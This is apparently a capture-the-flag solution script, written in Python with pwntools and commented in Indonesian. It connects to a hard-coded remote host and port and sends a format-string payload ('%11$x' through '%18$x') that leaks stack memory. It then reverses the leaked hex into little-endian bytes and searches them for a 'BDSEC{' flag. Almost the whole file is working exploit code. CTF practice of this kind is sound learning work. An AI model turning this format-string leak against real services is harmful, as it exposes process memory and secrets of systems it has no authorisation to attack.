from pwn import *

# --- Detail Koneksi ---
host = '45.33.118.86'
port = 9992

# --- Fungsi Utama ---
def final_solution():
    """
    Mengirim payload singkat dan tertarget untuk menghindari penolakan server
    dan mengekstrak flag.
    """
    log.info(f"Menghubungkan ke {host}:{port}...")
    p = remote(host, port)
    p.recvuntil(b"Enter your input: ")

    # --- PAYLOAD BARU: Singkat dan menargetkan area flag ---
    # Payload ini cukup pendek untuk muat dalam buffer input yang kecil.
    # Kita menargetkan parameter 11-18, area umum di mana flag sering ditemukan.
    payload = b"%11$x.%12$x.%13$x.%14$x.%15$x.%16$x.%17$x.%18$x"
    
    log.info(f"Mengirim payload singkat: {payload.decode()}")
    p.sendline(payload)

    # Menerima output. Kita tidak perlu lagi recvuntil "Buzz says: " karena
    # output yang berhasil mungkin tidak mengandung frasa itu.
    try:
        leak = p.recvall(timeout=2).decode('latin-1').strip()
        log.success("Berhasil menerima respons!")
        log.info(f"Raw response: '{leak}'")
    except Exception as e:
        log.failure(f"Gagal menerima respons: {e}")
        p.close()
        return

    p.close()

    # Proses data yang bocor
    parts = leak.split('.')
    reconstructed_memory = b""
    for part in parts:
        # Cek jika string tidak kosong
        if part:
            try:
                # Tambahkan '0' di depan jika panjangnya ganjil
                if len(part) % 2 != 0:
                    part = '0' + part
                
                hex_bytes = bytes.fromhex(part)
                reconstructed_memory += hex_bytes[::-1] # Balik untuk little-endian
            except ValueError:
                log.warning(f"Melewati bagian tidak valid: '{part}'")
                continue
    
    # Cari flag
    decoded_string = reconstructed_memory.decode('latin-1')
    flag_start = decoded_string.find("BDSEC{")
    if flag_start != -1:
        flag_end = decoded_string.find("}", flag_start)
        if flag_end != -1:
            flag = decoded_string[flag_start : flag_end + 1]
            log.success(f"Flag ditemukan: {flag}")
            return flag
    
    log.failure("Flag tidak ditemukan. Coba sesuaikan jangkauan parameter (misal, %7$x.%8$x...).")
    print("\n--- HASIL DEKODE LENGKAP UNTUK DEBUG ---")
    print(decoded_string)
    print("------------------------------------------")

# --- Jalankan Skrip ---
if __name__ == "__main__":
    final_solution()
